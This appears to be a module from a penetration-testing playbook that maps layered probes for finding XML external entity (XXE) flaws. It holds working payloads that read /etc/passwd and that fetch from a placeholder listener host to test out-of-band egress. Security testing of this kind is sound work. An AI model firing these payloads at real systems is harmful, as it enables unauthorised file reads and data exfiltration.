# Detection — full — the complete signal-and-falsifier map

## The detection problem — where XXE actually hides

XXE is a parser-behavior bug — the "is there a parser" and "does it
resolve entities" are two different questions, and a wrong split
wastes a budget. The detection stack is layered:

```
Layer 0: does an XML parser see the input?      — the parser exists
Layer 1: do entities expand?                     — the class is live
Layer 2: do EXTERNAL entities resolve?           — file-read possible
Layer 3: do PARAM entities resolve?              — OOB possible
Layer 4: does the parser FETCH?                  — egress/OOB possible
Layer 5: does XInclude fire?                     — the no-DOCTYPE door
```

Each layer is a separate falsifier — a YES at layer N tells you exactly
which module to open.

## The input surfaces — where XML enters

- `Content-Type: application/xml`/`text/xml`/`application/soap+xml` —
  direct
- `application/x-www-form-urlencoded` `xml=`/`data=`/`body=`/`payload=` —
  nested-field
- `application/json` `{"xml": "..."}` — nested
- `multipart/form-data` `.xml`/`.svg`/`.docx`/`.xlsx`/`.plist`/`.rss`/`.epub` —
  upload
- `?xml=`/`data=`/`body=`/`config=`/`payload=` query-param
- an HTTP header carrying XML
- SAML `SAMLResponse`/`SAMLRequest` — base64
- WebDAV `PROPFIND`/`REPORT`/`MKCALENDAR`/`LOCK`/`PROPPATCH`
- `xml-stylesheet`/`xml-model`/`xsi:schemaLocation` in the doc itself
- a "import/convert/process" feature that takes XML

## Layer 0 — parse-detection probes

```
SEND: <?xml version="1.0"?><r>x</r>
SEND: <?xml version="1.0"?><r>                    — unclosed
SEND: <r><a></r>                                   — mismatched
SEND: &<>                                          — bare specials
```

Signal: a parse-ERROR (any exception, a SOAP Fault, a `ParseError`)
= a parser ran. No error = either no parser or the input never reached
it — keep going to layer 1.

## Layer 1 — the expansion oracle

```
SEND: <?xml?><!DOCTYPE r [<!ENTITY probe "XXE_PROBE">]><r>&probe;</r>
```

- `XXE_PROBE` in response → expansion live → the class is real
- `&probe;` literal → no expansion → `denied-conditions.md`
- error → parser refused entities → `denied-conditions.md`

## Layer 2 — the external-read oracle

```
SEND: <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```

- passwd lines → external entities live → `file-read.md`
- `Entity 'x' not defined` → external-entities off → the config gap
- `Failed to load`/FileNotFound → resolves, file missing → try a known path
- empty → external-entities suppressed → blind/error

## Layer 3 — the param-entity oracle

```
SEND: <!DOCTYPE r [<!ENTITY % p "<!ENTITY x 'PARAM_OK'>">%p;]><r>&x;</r>
```

- `PARAM_OK` → param-entities live → `blind-xxe.md`
- error/no-echo → param blocked → in-band only

## Layer 4 — the egress oracle

```
SEND: <!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU:8000/hit">%d;]><r/>
```

- listener hit → fetch + egress live → `blind-xxe.md`
- `UnknownHostException`/error → resolves but egress dead → local-DTD/
  error-channel
- no signal at all → egress dead, error suppressed → local-DTD only

## Layer 5 — the XInclude oracle

```
SEND: <r xmlns:xi="http://www.w3.org/2001/XInclude">
       <xi:include href="file:///etc/passwd" parse="text"/></r>
```

- passwd → XInclude live → `xinclude.md`
- `xi:include` ignored → XInclude off → dead-or-other-surface

## The "the fingerprint is the parser" — the error-driven map

The `&undefined;`/`<r><a></r>`/`<!ENTITY x "&x;">` self-ref probes —
the error text → `parser-specifics.md` — decide the per-parser payload
before wasting a rung.

## The "the shape is the surface" — the content-type map

| Signal | Module |
|---|---|
| `?wsdl`/SOAPAction | `soap-wsdl.md`/`soap-deep.md` |
| `SAMLResponse` | `saml.md` |
| `.svg`/`.docx`/`.plist` upload | `svg-xxe.md`/`ooxml.md`/`misc-formats.md` |
| `xml=`/`data=` field | `content-type-confusion.md` |
| `application/xml` body | the direct path |
| `{"xml": "..."}` | `content-type-confusion.md` |

## The "the response is the evidence" — what to record

- the verbatim `XXE_PROBE` echo — `evidence-kind class`
- the verbatim `file:`-read content — `evidence-kind impact`
- the verbatim OOB-hit line — `evidence-kind class`
- the verbatim error — `verdict=refutes` or `inconclusive`

## The "the oracle-chain is bounded" — the budget math

Layers 0–5 = 6 probes = inside the 5-probe/15-min per-layer budget —
the oracle-chain is CHEAP — run it before any payload loop.

## The "the fingerprint decides the payload" — the parser-matrix

`parser-specifics.md`/`parser-matrix-deep.md` — once the error names
the parser, the payload tier is decided — Xerces → param-compose-in-
external-DTD; libxml2 → internal-subset-compose-ok; .NET → XInclude
only if Prohibit; defusedxml → dead.

## The "the response-size is the signal" — the delta-oracle

Baseline body-length vs entity body-length — the delta = the file-size
— even before the content reads, the delta says "the fetch ran" — the
size-oracle for echo-suppressed parsers.

## The "the fetch-time is the signal" — the timing-oracle

A slow-fetch URL → the request takes the fetch's time — the timing
oracle for "did the entity resolve" when nothing echoes.

## The "the error IS the signal" — the exception-driven map

`FileNotFoundException: file:///nonexistent/...` — the URI in the error
= the fetch attempted = entities resolve = the file just doesn't exist
— the "fetch-failed ≠ mechanism-dead" distinction.
